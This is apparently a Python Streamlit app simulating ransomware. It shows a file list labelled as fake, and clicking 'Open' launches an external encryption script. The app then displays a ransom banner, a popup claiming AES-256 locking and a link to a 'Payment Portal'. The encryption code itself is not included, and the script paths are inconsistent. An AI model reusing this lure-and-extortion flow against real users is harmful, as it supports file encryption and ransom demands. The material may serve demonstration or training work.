import streamlit as st
import platform
import subprocess
import os

if "encrypted" not in st.session_state:
    st.session_state.encrypted = False
if "show_popup" not in st.session_state:
    st.session_state.show_popup = False

st.markdown("""
<style>
    .file-list {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-top: 20px;
    }
    .file-row {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 12px 20px;
        border: 1px solid #333;
        border-radius: 5px;
        background-color: #1c1c1c;
        color: white;
        transition: background-color 0.2s ease;
    }
    .file-row:hover {
        background-color: #2c2c2c;
    }
    .file-name {
        font-size: 1rem;
    }
    .ransom-note {
        background-color: #2a0f0f;
        border: 1px solid #ff4d4d;
        font-size: 2rem;
        font-weight: bold;
        text-align: center;
        padding: 20px;
        border-radius: 10px;
        color: white;
        margin: 20px 0;
    }
</style>
""", unsafe_allow_html=True)

st.title("Your Documents")
st.write("Click on any file to view it:")

FILE_DB = {
    "vacation.jpg": {"content": "Fake image content"},
    "financial.xlsx": {"content": "Fake spreadsheet data"},
    "passwords.txt": {"content": "Fake passwords data"},
    "open.txt": {"content": "Important notes and credentials"}
}

st.markdown('<div class="file-list">', unsafe_allow_html=True)
for filename, data in FILE_DB.items():
    col1, col2 = st.columns([3, 1])
    with col1:
        st.markdown(f'<div class="file-name">📄 {filename}</div>', unsafe_allow_html=True)
    with col2:
        if st.button("Open", key=f"open_{filename}"):
            st.session_state.show_popup = True
            if not st.session_state.encrypted:
                encrypt_script = os.path.join(os.path.dirname(__file__), "encrypt.py")
                try:
                    if platform.system() == "Windows":
                        subprocess.Popen(["python", "encrypt.py", "testing/open.txt"])

                    else:
                          subprocess.Popen(["python3", "encrypt_script.py"])
                    st.session_state.encrypted = True
                    st.rerun()
                except Exception as e:
                    st.error(f"Encryption failed: {str(e)}")
st.markdown('</div>', unsafe_allow_html=True)

if st.session_state.encrypted:
    st.markdown("---")
    st.markdown('<div class="ransom-note">🚨 YOUR FILES HAVE BEEN ENCRYPTED!</div>', unsafe_allow_html=True)

if st.session_state.show_popup:
    st.markdown("""
        <div style='position: fixed; top: 25%; left: 35%; width: 400px; padding: 20px;
                    background-color: #2a0f0f; color: #fff; border: 2px solid #ff4d4d;
                    border-radius: 10px;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.4); z-index: 9999; text-align: center;'>
            <h2 style='color:#ff4d4d;'> Encrypted!</h2>
            <p>Your file has been locked with AES-256 encryption.</p>
            <p>Go to the Payment Portal to decrypt.</p>
        </div>
    """, unsafe_allow_html=True)
if st.session_state.encrypted:
    if st.button("OK",key="popup_ok"):
        st.session_state.show_popup = False
        left,center,right=st.columns([1,1,1])
        with center:
            st.page_link("pages/pay.py", label="💳 Payment Portal")
  
st.markdown("---")
 